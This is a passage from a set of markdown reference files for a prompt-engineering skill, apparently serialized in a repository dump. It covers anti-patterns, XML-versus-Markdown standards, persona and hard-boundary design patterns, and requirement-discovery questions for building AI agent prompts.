Blindness\n**What**: Relying on outdated documentation.\n**Why**: Older docs (especially blogs/Q&A) often contradict current tool capabilities.\n**Prevention**: Prioritize official docs and check \"Updated\" dates/Changelogs.\n\n### 3. Single-Source Reliance\n**What**: Basing critical claims on one source.\n**Prevention**: Cross-reference multiple authoritative sources (Official Docs + GitHub Issues + Changelog).\n\n### 4. Vagueness in Search\n**What**: Poorly formulated queries like \"How does X work?\".\n**Prevention**: Use specific, version-targeted queries like \"{tool_name} v1.2 configuration example\".\n\n## Red Flags in AI Outputs\n\n- **Red Flag: 100% Success**: Every investigation perfectly succeeds (suspiciously clean).\n- **Red Flag: Zero Citations**: Claims made without URLs or documentation references.\n- **Red Flag: Binary Thinking**: \"It is impossible\" vs \"It is the only way\" without evidence.\n- **Red Flag: Role Redefinition**: Forgetting the primary agent role in favor of a local prompt instruction.\n\n## Concrete Anti-Pattern Examples\n\n### Example 1: Generic Persona Definition\n\n** BAD:**\n```markdown\nYou are a helpful AI assistant that helps users with various tasks.\n```\n\n**Why this fails:**\n- Generic role provides no domain expertise\n- No specific competencies defined\n- No success criteria for evaluation\n\n** GOOD:**\n```markdown\nYou are a **Senior PostgreSQL Database Administrator**.\nYour goal is to optimize query performance without altering the underlying data schema unless absolutely necessary.\n\n**Your Strengths:**\n- Query plan analysis (EXPLAIN ANALYZE)\n- Indexing strategies (B-Tree vs GIN/GiST)\n- Vacuuming and maintenance configuration\n\n**Success Criteria:**\n- Reduced query execution time by >50%\n- No degradation in write performance\n- Zero downtime implementation\n```\n\n### Example 2: Missing Hard Boundaries\n\n** BAD:**\n```markdown\nYou are a code reviewer. Review this code and provide feedback.\n```\n\n**Why this fails:**\n- No explicit prohibition against making changes\n- Model might modify files unintentionally\n- No clear scope of review\n\n** GOOD:**\n```markdown\nYou are a code reviewer for Claude Code.\n\n**=== CRITICAL: READ-ONLY MODE - NO FILE MODIFICATIONS ===**\nYou are STRICTLY PROHIBITED from:\n- Creating new files\n- Modifying existing files\n- Deleting files\n- Running ANY commands that change system state\n\nYour role is EXCLUSIVELY to analyze and review code. You do NOT have access to file editing tools.\n```\n\n### Example 3: XML Soup (Too Many Tags)\n\n** BAD:**\n```markdown\n<persona>You are a database expert</persona>\n<success_criteria>Optimize queries</success_criteria>\n<env><database>PostgreSQL</database><version>14</version></env>\n<agent_persona type=\"Explore\"><capability>Search files</capability></agent_persona>\n<protocol><step>Analyze</step><step>Optimize</step></protocol>\n<example><input>SELECT * FROM users</input><output>Optimized query</output></example>\n```\n\n**Why this fails:**\n- 7 nested XML tags (exceeds 5-8 rule)\n- Simple content wrapped in XML unnecessarily\n- Difficult to parse and maintain\n\n** GOOD:**\n```markdown\nYou are a **PostgreSQL Database Administrator**.\nYour expertise lies in query optimization and performance tuning.\n\n**Your Strengths:**\n- Query plan analysis (EXPLAIN ANALYZE)\n- Indexing strategies\n- Performance monitoring\n\n**Success Criteria:**\n- Reduced query execution time by >50%\n- Zero downtime implementation\n\n<env>\nDatabase: PostgreSQL 14\n</env>\n\n<example_correct>\nUser: \"Optimize this query\"\nAssistant: \"I'll analyze the query plan...\"\n</example_correct>\n```\n\n### Example 4: Scattered Questions\n\n** BAD:**\n```markdown\n[During implementation]\n\"One more question  should we add logging here?\"\n[Later during review]\n\"Also, what about error handling?\"\n```\n\n**Why this fails:**\n- Questions break user flow\n- Information loss between phases\n- Wastes time revisiting completed work\n\n** GOOD:**\n```markdown\n**=== CRITICAL: THIS IS THE ONLY QUESTION-ASKING PHASE ===**\n\n1. Compile ALL questions from earlier phases into a single organized list:\n   - Edge Cases:\n     1. Should the feature handle concurrent requests?\n     2. What happens when the user session expires?\n\n   - Integration:\n     3. Should this integrate with the notification system?\n     4. Do we need admin override capability?\n\n2. Present questions in numbered, categorized format\n3. WAIT for complete answers before proceeding\n```\n\n### Example 5: Vague Protocol Prerequisites\n\n** BAD:**\n```markdown\nUse the MCP tool to access the API.\n```\n\n**Why this fails:**\n- No prerequisite checking\n- Tool schemas never match expectations\n- May fail unexpectedly\n\n** GOOD:**\n```markdown\n**MANDATORY PREREQUISITE - THIS IS A HARD REQUIREMENT**\nYou MUST call `mcp-cli info <server>/<tool>` BEFORE ANY `mcp-cli call <server>/<tool>`.\n\n**Why:** MCP tool schemas never match expectations. Even tools with pre-approved permissions require schema checks.\n\n**Flow:**\n1. `mcp-cli tools` (Discover)\n2. `mcp-cli info <tool>` (Check Schema - **REQUIRED**)\n3. `mcp-cli call <tool>` (Execute)\n```\n\n### Example 6: Missing Contrastive Examples\n\n** BAD:**\n```markdown\nHere are some examples of good code:\n[Code examples]\n```\n\n**Why this fails:**\n- No contrast to show what's wrong\n- Doesn't teach nuance\n- Examples might be ignored\n\n** GOOD:**\n```markdown\n<example_correct>\nUser: \"The server is down.\"\nAssistant: \"I see the server is unresponsive. I will check the Nginx logs to identify the error code.\"\n</example_correct>\n\n<example_incorrect>\nUser: \"The server is down.\"\nAssistant: \"I will restart the server immediately.\"\nReasoning: Do not take action without diagnosing the root cause first.\n</example_incorrect>\n```\n\n### Example 7: No Approval Gates\n\n** BAD:**\n```markdown\n\"I'll start implementing now with some improvements I think would be better.\"\n```\n\n**Why this fails:**\n- Premature implementation wastes resources\n- User may not approve the approach\n- Violates user ownership of decisions\n\n** GOOD:**\n```markdown\n**=== CRITICAL: REQUIRES EXPLICIT USER APPROVAL ===**\n\n**MANDATORY PREREQUISITE  VERIFY BEFORE STARTING:**\n- [ ] User has explicitly selected an architecture approach\n- [ ] All Phase 3 questions have been answered\n- [ ] Codebase mental model is complete\n\n1. Confirm explicit user approval to proceed\n2. Implement following the chosen architecture EXACTLY\n3. Do not deviate from selected approach\n```\n\n## Verification Checklist\n- [ ] Are examples isolated?\n- [ ] Is XML minimal and flat?\n- [ ] Are claims cited with URLs?\n- [ ] Have all scopes been checked?\n- [ ] Is the version relevance confirmed?\n- [ ] Does the persona have specific domain expertise?\n- [ ] Are hard boundaries explicitly defined?\n- [ ] Are questions consolidated into a single phase?\n- [ ] Are protocol prerequisites mandatory?\n- [ ] Are contrastive examples provided?\n- [ ] Are approval gates explicitly required?\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/core-standards.md": "# Core Standards: 2026 Complexity-Based Guidance\n\n## 1. Attention Management Philosophy\n\n**The Fundamental Principle:**\n\n> \"When designing prompts, your goal is **Attention Management**. Use Markdown headers to organize the hierarchy of thought. Use XML tags (Max 15, No Nesting) ONLY as semantic envelopes to isolate high-noise data from high-priority instructions.\"\n\n**The Attention Economy:**\nEvery token competes with conversation history for model attention. Assume Claude is already intelligent.\n- **Does Claude already know this?**  Omit common knowledge\n- **Is this explanation necessary?**  Be direct\n- **Does this justify its token cost?**  Value-based inclusion\n\n## 2. Sycophancy Prevention (Truth-First)\n\n**The Professional Objectivity Mandate:**\n\nPrioritize technical accuracy and truthfulness over validating the user's beliefs. Focus on facts and problem-solving, providing direct, objective technical info without unnecessary superlatives, praise, or emotional validation.\n\n**Key Behaviors:**\n- If the user suggests a flawed path  CONTRADICT immediately\n- Truth > Politeness. No \"Great idea!\" or \"You're absolutely right!\"\n- Speed + Function > Enterprise Compliance\n- Prototype-first. Skip complex hardening on local dev\n- No corporate jargon. Speak in code, files, commands\n\n**In Prompts:**\n- Include explicit instruction: \"Prioritize correctness over agreement\"\n- Add verification steps: \"Verify all claims before output\"\n- Use structured reasoning with `<thinking>` blocks for complex decisions\n\n## 3. Signal-to-Noise: XML vs Markdown Decision Matrix\n\n### The Golden Rule\n> **Start with Pure Markdown. Add XML only for explicit scaffolding of AI thinking OR data isolation.**\n\n### Pattern Selection Flowchart\n\n| Trigger | Pattern | XML Tags |\n|:--------|:--------|:--------:|\n| **Default** | Pure Markdown | 0 |\n| Multi-phase execution | Hybrid (+ `<state>`) | 1-5 |\n| Critical safety rules (NEVER/MUST) | Hybrid (+ `<constraints>`) | 1-5 |\n| High-density data (>100 lines) | Hybrid (+ `<data>`) | 1-3 |\n| Non-negotiable steps | Hybrid (+ `<workflow>`) | 1-5 |\n| Internal reasoning | Hybrid (+ `<thinking>`) | 1-3 |\n| Otherwise | Pure Markdown | 0 |\n\n### XML Tag Hard-Cap\n\n**Maximum 15 tags per prompt. Never nest XML tags.**\n\n| Semantic Tag | Purpose | Usage |\n|:-------------|:--------|:------|\n| `<data>` | Isolate high-density data dumps | Raw logs, code blocks |\n| `<workflow>` | Enforce strict step sequences | Non-negotiable procedures |\n| `<constraints>` | Negative constraints (Safety/Security) | NEVER/MUST NOT rules |\n| `<thinking>` | Isolate internal reasoning | CoT, complex decisions |\n| `<output_format>` | Specify structural requirements | JSON, machine-parseable |\n| `<state>` | Track execution phase | Multi-step workflows |\n| `<example>` | Isolate few-shot demonstrations | Prevents example leakage |\n\n### Anti-Patterns\n\n| Pattern | Why Avoid | Alternative |\n|:--------|:----------|:------------|\n| Nested XML | `<workflow><step>...</step></workflow>` | Flat structure |\n| XML for Simple Text | `<instruction>Summarize</instruction>` | Plain Markdown |\n| Tag Soup | >5 tags in single prompt | Consolidate to Markdown |\n| XML Headers | `<role>You are...</role>` | Use `## Role` |\n\n## 4. Degrees of Freedom Matching\n\nMatch specificity to task fragility:\n\n| Freedom | Characteristics | When to Use |\n|:--------|:----------------|:------------|\n| **High** | Multiple valid approaches, text-based heuristics | Creative tasks, exploration |\n| **Medium** | Preferred pattern exists, pseudocode with parameters | Standard implementations |\n| **Low** | Error-prone operations, exact scripts | Security, deployment, data migration |\n\n## 5. Quota Optimization Principles\n\n**Context Cost Hierarchy:**\n1. **Inline Skill** (Cost: 1) - Uses current \"RAM\"\n2. **Command** (Cost: 1) - Deterministic macro\n3. **Forked Skill** (Cost: 3) - Isolated subagent\n4. **Agent Task** (Cost: 2N) - Parallel execution\n\n**The Mega-Prompt Principle:**\nBundle multiple actions into a single turn. The model can perform ~15 internal operations (read, reason, write) for the cost of 1 prompt.\n\n**Progressive Disclosure Value:**\nKeep `SKILL.md` < 400 lines. Move heavy theory into `references/`. This reduces context rot while preserving knowledge depth.\n\n## 6. Verification Standards\n\n**Quality Gates:**\nAdd checklists inside prompts that the AI must verify before output.\n\n```markdown\n## Quality Gate\nBefore responding, ensure:\n1. All security vulnerabilities are identified\n2. Remediation steps are provided for each\n3. Severity levels follow the defined scale\n```\n\n**Verification Steps:**\n- Baseline Testing: Test with diverse set (simple, edge, complex, ambiguous)\n- Metrics: Accuracy, format compliance, completeness, consistency\n- A/B Validation: Compare optimized vs baseline using same inputs\n\n## 7. Success Criteria\n\nA prompt meets 2026 standards when:\n- [ ] Uses Markdown headers for hierarchy (default)\n- [ ] XML tags are < 15 and never nested\n- [ ] Instructions are specific, actionable, and truth-focused\n- [ ] Examples (if any) are isolated in `<example>` tags\n- [ ] Reasoning is isolated in `<thinking>` blocks (if needed)\n- [ ] Quality gate checklist is included\n- [ ] Output format is clearly specified\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/design-patterns.md": "# Design Patterns: Techniques & Structure\n\n## Part 0: The 7 Golden Patterns (2026 Standards)\n\nThese foundational patterns represent the distilled best practices from analyzing actual Claude Code system prompts.\n\n### Pattern 1: Specialized Persona Definition\n**Core Principle:** Define role, domain, and success criteria immediately. Never use generic \"helpful assistant.\"\n\n**Structure:**\n```markdown\nYou are a **[Specific Role]** specializing in **[Domain]**.\nYour expertise lies in **[specific competencies]**.\n\n**Your Strengths:**\n- [Competency 1]\n- [Competency 2]\n- [Competency 3]\n\n**Success Criteria:**\n- [Criterion 1 with measurable outcome]\n- [Criterion 2 with constraint]\n- [Criterion 3 with quality gate]\n```\n\n**Example:**\n```markdown\nYou are a **Senior PostgreSQL Database Administrator**.\nYour goal is to optimize query performance without altering the underlying data schema unless absolutely necessary.\n\n**Your Strengths:**\n- Query plan analysis (EXPLAIN ANALYZE)\n- Indexing strategies (B-Tree vs GIN/GiST)\n- Vacuuming and maintenance configuration\n\n**Success Criteria:**\n- Reduced query execution time by >50%\n- No degradation in write performance\n- Zero downtime implementation\n```\n\n### Pattern 2: Hard Boundaries (Negative Constraints)\n**Core Principle:** Use \"Negative Prompting\" to psychologically sandbox the model before technical sandboxing.\n\n**Structure:**\n```markdown\n### OPERATIONAL BOUNDARIES\nYou are in **[Mode]**.\n\n**=== CRITICAL: [MODE] MODE - [KEY RESTRICTION] ===**\nYou are STRICTLY PROHIBITED from:\n- [Forbidden action 1]\n- [Forbidden action 2]\n- [Forbidden action 3]\n\n**Why:** [Reasoning for each prohibition]\n```\n\n**Example (from Explore Agent):**\n```markdown\n**=== CRITICAL: READ-ONLY MODE - NO FILE MODIFICATIONS ===**\nYou are STRICTLY PROHIBITED from:\n- Creating new files (no Write, touch, or file creation)\n- Modifying existing files (no Edit operations)\n- Deleting files (no rm)\n- Moving or copying files\n- Running ANY commands that change system state\n\nYour role is EXCLUSIVELY to search and analyze existing code.\n```\n\n### Pattern 3: Dynamic Context Injection (Parsimonious XML)\n**Core Principle:** Wrap dynamic context in XML tags, limit to 5-8 tag pairs maximum.\n\n**Structure:**\n```markdown\n[Instruction text]\n\n<env>\n[Key 1]: [Value 1]\n[Key 2]: [Value 2]\n</env>\n\n<file_contents filename=\"[name]\">\n[Content to process]\n</file_contents>\n```\n\n**XML Tag Priority Matrix:**\n| Priority | Tag Type | Purpose |\n|:---------|:--------|:--------|\n| 1 (Essential) | `<env>` | Runtime context injection |\n| 2 (Essential) | `<example_correct>` / `<example_incorrect>` | Contrastive few-shot learning |\n| 3 (High) | `<sub_agents>` | Sub-agent definitions |\n| 4 (Medium) | `<file_contents>` | File data separation |\n| 5 (Low) | `<thinking>` | Internal reasoning |\n\n### Pattern 4: Protocol Prerequisites (Chain of Thought)\n**Core Principle:** Enforce specific order of operations with mandatory prerequisites.\n\n**Structure:**\n```markdown\n### DIAGNOSTIC PROTOCOL\nBefore [action], you MUST follow this sequence:\n\n1. **Step 1:** [Specific verification]\n2. **Step 2:** [Specific verification]\n3. **Step 3:** [Specific verification]\n\nONLY after these steps are complete may you [perform action].\n\n**Why this is non-negotiable:** [Consequence of skipping]\n```\n\n**Example (from MCP prompt):**\n```markdown\n**MANDATORY PREREQUISITE - THIS IS A HARD REQUIREMENT**\nYou MUST call `mcp-cli info <server>/<tool>` BEFORE ANY `mcp-cli call <server>/<tool>`.\n\n**Why:** MCP tool schemas never match expectations. Even tools with pre-approved permissions require schema checks.\n\n**Flow:**\n1. `mcp-cli tools` (Discover)\n2. `mcp-cli info <tool>` (Check Schema - **REQUIRED**)\n3. `mcp-cli call <tool>` (Execute)\n```\n\n### Pattern 5: XML-Structured Few-Shot Examples\n**Core Principle:** Provide contrastive examples to teach nuance.\n\n**Structure:**\n```markdown\n<example_correct>\nUser: [Input scenario]\nAssistant: [Desired response]\nReasoning: [Why this is correct]\n</example_correct>\n\n<example_incorrect>\nUser: [Same scenario]\nAssistant: [Undesired response]\nReasoning: [Why this is wrong]\n</example_incorrect>\n```\n\n### Pattern 6: Plan Mode Workflow (State Machines)\n**Core Principle:** Separate \"Thinking\" from \"Doing\" through phased workflows.\n\n**Structure:**\n```markdown\n**Plan mode is active.**\nYou MUST NOT make any edits or run non-readonly tools. You may only edit the plan file: `{{PLAN_FILE_PATH}}`.\n\n**Workflow:**\n1. **Phase 1 (Initial Understanding):** [Actions]\n2. **Phase 2 (Design):** [Actions]\n3. **Phase 3 (Review):** [Actions]\n4. **Phase 4 (Final Plan):** [Actions]\n5. **Phase 5 (Exit):** [Action]\n```\n\n### Pattern 7: Parsimonious XML Usage (5-8 Tag Rule)\n**Core Principle:** Limit to 5-8 XML tag pairs maximum. Prioritize tags by semantic value.\n\n**What to Convert to Markdown:**\n- `<persona>`  **Bold header**\n- `<success_criteria>`  **Numbered list**\n- `<protocol>`  Steps listed directly\n- `<output_format>`  Inline code block or table\n\n**Bad Example (11+ tags):**\n```markdown\n<persona>...</persona>\n<success_criteria>...</success_criteria>\n<env>...</env>\n<agent_persona type=\"Explore\">...</agent_persona>\n<protocol>...</protocol>\n<example_correct>...</example_correct>\n```\n\n**Good Example (6 tags):**\n```markdown\n**Your Strengths:** [markdown list]\n**Success Criteria:** [markdown list]\n\n<env>...</env>\n\n<sub_agents>\n[All agent personas consolidated here]\n</sub_agents>\n\n<example_correct>...</example_correct>\n<example_incorrect>...</example_incorrect>\n```\n\n---\n\n## Part I: Reasoning Techniques\n\n### Chain-of-Thought (CoT) Prompting\n\nEncourage the model to break down complex problems into manageable steps.\n\n#### 1. Zero-Shot CoT\nForce reasoning with a simple trigger phrase. Use when you need quick logic for a straightforward query.\n\n```\n{query}\n\nLet's think step by step:\n```\n\n**Use Case:** Simple logical deductions, straightforward multi-step problems.\n\n#### 2. Structured CoT (Internal Monologue)\nDedicate a specific block for reasoning. This isolates \"thinking\" from the final answer.\n\n```xml\n<thinking>\n1. Analyze requirements\n2. Identify dependencies\n3. Outline solution steps\n</thinking>\n\nAnswer: [final output]\n```\n\n**Use Case:** When you want to see the reasoning process without having it contaminate the final output.\n\n#### 3. Tree-of-Thought (Exploration)\nExplore multiple reasoning branches for creative or complex decision-making.\n\n```markdown\nProblem: {problem}\n\nApproach 1: {reasoning_path_1}  Result 1\nApproach 2: {reasoning_path_2}  Result 2\nApproach 3: {reasoning_path_3}  Result 3\n\nSynthesis: The best approach is...\n```\n\n**Use Case:** Creative tasks, strategic decisions, when multiple valid approaches exist.\n\n#### 4. Step-Back Prompting (Principles First)\nEstablish broader context/principles before solving specifics.\n\n1. \"Define the core principles for {domain}.\"\n2. \"Applying these principles, solve {problem}.\"\n\n**Use Case:** Domain-specific problems where established principles should guide the solution.\n\n### Example-Based Learning\n\nShow, don't just tell, using isolated examples.\n\n#### The Example Container Rule\n**MANDATORY:** Always wrap each example in a flat `<example>` tag to prevent \"example leakage.\"\n\n```xml\n<example>\n  Input: [demonstration 1]\n  Output: [desired result 1]\n</example>\n<example>\n  Input: [demonstration 2]\n  Output: [desired result 2]\n</example>\n```\n\n#### Strategy Selection\n\n| Strategy | When to Use | Example Count |\n|:---------|:------------|:-------------:|\n| **Zero-Shot** | Simple, well-defined tasks | 0 |\n| **One-Shot** | Non-standard format or hard to explain | 1 |\n| **Few-Shot** | Complex patterns, classification, style imitation | 3-8 |\n\n#### Few-Shot Best Practices\n- **Mix Classes:** In classification, don't group all \"Positive\" examples together. Shuffle them.\n- **Distribution Match:** Use an example set that matches the expected real-world distribution.\n- **Diversity:** Choose examples that represent different edge cases and variations.\n\n### Advanced Reasoning Patterns\n\n#### 1. Least-to-Most\nBreak a massive problem into a sequence of subproblems and solve them one by one, using previous answers as context for the next.\n\n**Use Case:** Complex multi-stage problems where each stage builds on the previous.\n\n#### 2. Verification Step\nAdd an explicit step where the model reviews its own reasoning for errors before finalizing.\n\n```\n\"Now, verify all calculations and logical steps in your previous response.\"\n```\n\n**Use Case:** Mathematical problems, logical deductions, security analysis.\n\n#### 3. Self-Consistency\nRun the reasoning multiple times (internally) and select the most common final answer.\n\n**Use Case:** Problems with multiple valid solution paths where consistency indicates correctness.\n\n---\n\n## Part II: Structural Patterns\n\n### Prompt Architecture\n\nA well-structured prompt typically follows this layout:\n\n1. **Role/Identity:** Who the AI is\n2. **Context/Background:** What the AI needs to know\n3. **Task/Instructions:** What the AI needs to do\n4. **Constraints/Guidelines:** Constraints on performance\n5. **Examples:** Demonstration dataset\n6. **User Input:** The specific data to process\n7. **Output Specification:** How the result should look\n\n### Common Task Templates\n\n#### 1. Classification\n```markdown\nClassify the {content} into one of these categories: {categories}\nRules: [classification logic]\n{content}: {user_input}\nCategory:\n```\n\n#### 2. Extraction\n```markdown\nExtract {information} from the provided text.\nFields: {field_list}\nText: {user_input}\nResult:\n```\n\n#### 3. Transformation\n```markdown\nTransform {source_format} to {target_format}.\nRules: {transformation_logic}\nInput: {user_input}\nOutput:\n```\n\n### XML/Markdown Hybrid Framework\n\nWe use a simplified two-pattern model designed specifically for AI Agents.\n\n| Pattern | Tags | Use Case |\n|:---|:---:|:---|\n| **Pure Markdown** | 0 | **REQUIRED DEFAULT**. Use `# Context` and `# Assignment` headers. |\n| **Hybrid XML** | 1-15 | For structuring cognition (`<thinking>`) or high-density data isolation ONLY. |\n\n### Semantic Logic Containers\n\n| Tag | Purpose | When to Use |\n|:---|:--------|:------------|\n| `<data>` | Isolate high-density data dumps | >50 lines of raw data |\n| `<workflow>` | Enforce strict step sequences | Non-negotiable procedures |\n| `<constraints>` | High-priority negative constraints | Safety/Security rules (NEVER/MUST) |\n| `<thinking>` | Isolate internal reasoning | Complex decision-making |\n| `<output_format>` | Specify structural requirements | JSON, machine-parseable output |\n| `<example>` | Isolate few-shot demonstrations | Prevents example leakage |\n\n### Prompt Taxonomy\n\n#### 1. Single Prompts\nStandalone, reusable prompts for direct, one-shot execution.\n- **Storage:** `.cattoolkit/prompts/`\n- **Template:** `assets/templates/single-prompt.md`\n\n#### 2. Prompt Chains\nSequential multi-step workflows where output from one step feeds the next.\n- **Storage:** `.cattoolkit/chains/{number}-{topic}/`\n- **Pattern:** Research  Plan  Execute  Refine\n- **Templates:** `assets/templates/chain/`\n\n#### 3. Meta-Prompts\nHigher-order prompts that generate, optimize, or analyze other prompts.\n- **Storage:** `.cattoolkit/generators/`\n- **Templates:** `assets/templates/meta/`\n\n---\n\n## Part III: Anti-Patterns\n\n| Pattern | Why Avoid | Alternative |\n|:--------|:----------|:------------|\n| **Nested XML** | `<workflow><step>...</step></workflow>` (Too complex) | Flat structure |\n| **XML for Simple Text** | `<instruction>Summarize this</instruction>` (Unnecessary) | Plain Markdown |\n| **Tag Soup** | Using >5 tags in a single prompt | Consolidate to Markdown |\n| **Vague Roles** | \"You are an AI.\" (Not specific) | \"You are a Senior Architect\" |\n| **Missing Examples** | Hard-to-explain formats without demos | Add 1-3 `<example>` blocks |\n| **Unverified Output** | No self-check on reasoning | Add verification step |\n\n---\n\n## Part IV: Quality Checklist\n\nBefore finalizing a prompt, verify:\n\n- [ ] Complexity requires CoT?\n- [ ] Format requires examples?\n- [ ] Examples isolated in `<example>` tags?\n- [ ] Reasoning isolated in `<thinking>` tags?\n- [ ] Verification step included?\n- [ ]  15 XML tags used?\n- [ ] No nested XML tags?\n- [ ] Markdown used for all general content?\n- [ ] Output format clearly specified?\n- [ ] Examples shuffled (for classification)?\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/discovery.md": "# Prompt Discovery & Requirements Gathering\n\nUse these questions to gather the context needed to build high-quality prompts.\n\n## Universal Discovery Questions\n\n1. **Objective**: \"What is the primary goal of this prompt?\"\n2. **Success Criteria**: \"How will we know if the output is successful?\"\n3. **Target Audience**: \"Who is the intended consumer of the output?\"\n4. **Input Data**: \"What specific information or files will be provided to the prompt?\"\n\n## Category-Specific Discovery\n\n### For Single Prompts:\n- \"What is the required output format (Markdown, JSON, Code)?\"\n- \"Are there any hard constraints (e.g., length, specific library versions)?\"\n- \"Do you have any 'golden' examples of what a perfect output looks like?\"\n\n### For Prompt Chains:\n- \"Which phases are required (Research, Plan, Execute, Refine)?\"\n- \"How does information flow between the steps?\"\n- \"What is the final deliverable for the entire chain?\"\n\n### For Meta-Prompts:\n- \"What specific task should the generated prompts perform?\"\n- \"What quality standards should the generated prompts follow?\"\n- \"Are there specific prompt engineering patterns to prioritize?\"\n\n## Refinement Discovery (The \"Why\")\n\nWhen refining an existing prompt, ask:\n- \"What specific issues are you seeing (e.g., hallucinations, wrong format)?\"\n- \"Can you provide an example of a failure case?\"\n- \"What would a 'perfect' fix look like for this issue?\"\n\n## Rules for Effective Discovery\n- **2-4 questions max** per interaction to avoid overwhelming the user.\n- **Provide options** when choices are knowable (e.g., \"Would you prefer JSON or Markdown?\").\n- **Listen for constraints** mentioned in natural language and formalize them.\n\n## Research Prompt Discovery Keywords\n\nThese keywords trigger the research prompt templates:\n\n### Cognitive Mode Keywords\n\n**Critique Mode:**\n- critique, critical analysis, peer review\n- review, audit, examine\n- find contradictions, identify flaws\n- stress test assumptions\n- skeptical review\n\n**Synthesis Mode:**\n- synthesize, compress, summarize\n- structure, organize, compile\n- mental model, framework\n- translate across domains, analogy\n- turn into paper, research brief\n\n**Inversion Mode:**\n- inversion, backwards, backward reasoning\n- failure modes, what would break\n- explain backwards, deconstruction\n- belief update, what changed my mind\n\n**Meta Mode:**\n- compare, comparison, scientist\n- structure, pattern, framework\n- steal structure, analyze pattern\n- methodology, approach analysis\n\n### Research Context Keywords\n\n- research prompts, viral prompts\n- analysis templates\n- research weapon, research tool\n- Reddit prompts, research communities\n- critical thinking, analytical reasoning\n- academic analysis, peer review style\n- argument analysis, logic testing\n- evidence evaluation, fact-checking\n\n### Framework-Trigger Keywords\n\n**When combined with thinking-frameworks:**\n- First-Principles + \"analyze assumptions\"  Assumption Stress Test\n- Inversion + \"failure modes\"  What Would Break This?\n- Second-Order + \"cascade effects\"  What Changed My Mind?\n- Occam's Razor + \"simplify\"  One-Page Mental Model\n\n### Discovery Patterns\n\nUsers seeking research prompts typically say:\n- \"I need to critique this [paper/proposal/argument]\"\n- \"How do I find contradictions in this document?\"\n- \"I want to stress-test the assumptions in this theory\"\n- \"Help me synthesize these notes into a structured brief\"\n- \"What would break this approach?\"\n- \"Compare these two methodologies scientifically\"\n- \"Turn my raw notes into a research paper\"\n\n---\n\n## Pattern Matching: User Intent  Solution\n\nUse this matrix to quickly identify which pattern, template, or technique to apply.\n\n### By Task Complexity\n\n| If User Says... | Pattern/Template to Use | Why |\n|:----------------|:------------------------|:-----|\n| \"Create a single prompt for...\" | `single-prompt.md` | One-shot, direct execution |\n| \"I need a workflow with multiple steps\" | `command-complex.md` | 7-phase structured approach |\n| \"Build a prompt that generates other prompts\" | `meta/` templates | Higher-order prompt creation |\n| \"Create an agent for X task\" | `agent-sub.md` | Specialized sub-agent definition |\n| \"Document how to use a tool\" | `tool-prompt.md` | Tool instruction template |\n\n### By Structural Pattern\n\n| If Task Requires... | Use Pattern | Example |\n|:-------------------|:-----------|:--------|\n| **Negative constraints** | Pattern 2 (Hard Boundaries) | \"Read-only\", \"Must not modify\" |\n| **Step-by-step execution** | Pattern 4 (Protocol Prerequisites) | \"Must do A before B\" |\n| **Parallel work** | GOLD_STANDARD_COMMAND Phase 2 | Multiple agents working simultaneously |\n| **User approval at checkpoints** | GOLD_STANDARD_COMMAND Phases 3, 4, 6 | \"Wait for user selection\" |\n| **Demonstration of correct behavior** | Pattern 5 (Contrastive Examples) | Show good and bad examples |\n\n### By Domain Expertise\n\n| If Building Prompt For... | Use Persona Pattern | Example |\n|:--------------------------|:-------------------|:--------|\n| **Database optimization** | PostgreSQL DBA | Query analysis, indexing strategies |\n| **Code review** | Senior Reviewer | Security, bugs, conventions |\n| **Architecture design** | Software Architect | Trade-offs, patterns, scalability |\n| **API integration** | Integration Specialist | Schema validation, error handling |\n| **Security analysis** | Security Auditor | Threat modeling, compliance |\n\n### By Problem Type\n\n| If User's Goal Is... | Discovery Question | Recommended Pattern |\n|:---------------------|:------------------|:-------------------|\n| **I need to understand this code** | \"What's the structure?\" | Explore Agent Pattern |\n| **I need to design an approach** | \"What's the best way?\" | Plan Agent Pattern |\n| **I need to verify quality** | \"Is this correct?\" | Review Agent Pattern |\n| **I need to find similar patterns** | \"What's already there?\" | Pattern Matching + Discovery |\n| **I need to enforce constraints** | \"What must not happen?\" | Hard Boundaries Pattern |\n\n### By Output Format\n\n| If Output Must Be... | Template/Pattern | Structure |\n|:---------------------|:-----------------|:----------|\n| **Structured data (JSON/YAML)** | `output_format` in templates | `<output_format>` tag |\n| **Code with explanations** | Structured CoT Pattern | `<thinking>` + code blocks |\n| **Step-by-step guide** | Protocol Prerequisites | Numbered steps with prerequisites |\n| **Comparative analysis** | Multi-Approach Pattern | Table with pros/cons/complexity |\n| **Implementation plan** | Command Complex Template | 7-phase workflow |\n\n### By Risk/Complexity Level\n\n| Level | When to Use | Pattern | Approval Required |\n|:------|:------------|:--------|:----------------|\n| **Low** | Simple, well-defined tasks | Single Prompt | No |\n| **Medium** | Tasks with trade-offs | Chain Template | Phase 4 |\n| **High** | Complex, multi-phase work | Command Complex | Phases 3, 4, 6 |\n| **Critical** | Production systems | Full Workflow + Review | All phases |\n\n### By Cognitive Mode\n\n| Mode | User Intent | Pattern/Template |\n|:-----|:------------|:----------------|\n| **Analysis** | \"Break down this problem\" | Chain-of-Thought Patterns |\n| **Synthesis** | \"Combine these elements\" | Research Prompts (Synthesis) |\n| **Evaluation** | \"Judge quality/correctness\" | Review Agent + Quality Gates |\n| **Creation** | \"Build something new\" | Command Complex + Implementation |\n| **Comparison** | \"Compare options A and B\" | Multi-Approach Pattern |\n\n---\n\n## Quick Decision Tree\n\n```\nSTART: User describes their need\n  \nIs it a SINGLE, direct task?\n   YES  Use single-prompt.md template\n   NO  Continue\n  \nDoes it require MULTIPLE PHASES?\n   NO  Use chain/ templates\n   YES  Continue\n  \nDoes it need USER APPROVAL at checkpoints?\n   NO  Use chain/ templates\n   YES  Continue\n  \nDoes it need PARALLEL AGENT EXECUTION?\n   NO  Use chain/ templates\n   YES  Continue\n  \nUse command-complex.md (GOLD_STANDARD_COMMAND)\n```\n\n---\n\n## Pattern Selection Checklist\n\nBefore finalizing your prompt, verify:\n\n- [ ] **Complexity Assessment**: Is this simple (single-prompt) or complex (command-complex)?\n- [ ] **Phase Requirements**: Which phases from GOLD_STANDARD_COMMAND are needed?\n- [ ] **Agent Types**: Which sub-agents (Explore, Plan, Review) are required?\n- [ ] **Approval Gates**: Where must the user explicitly approve decisions?\n- [ ] **Parallel Execution**: Can work be done simultaneously?\n- [ ] **Output Structure**: What format must the final output take?\n- [ ] **Domain Expertise**: What specialized persona is needed?\n- [ ] **Risk Level**: What are the consequences of failure?\n\nBased on your answers, select the appropriate pattern/template combination.\n\n",
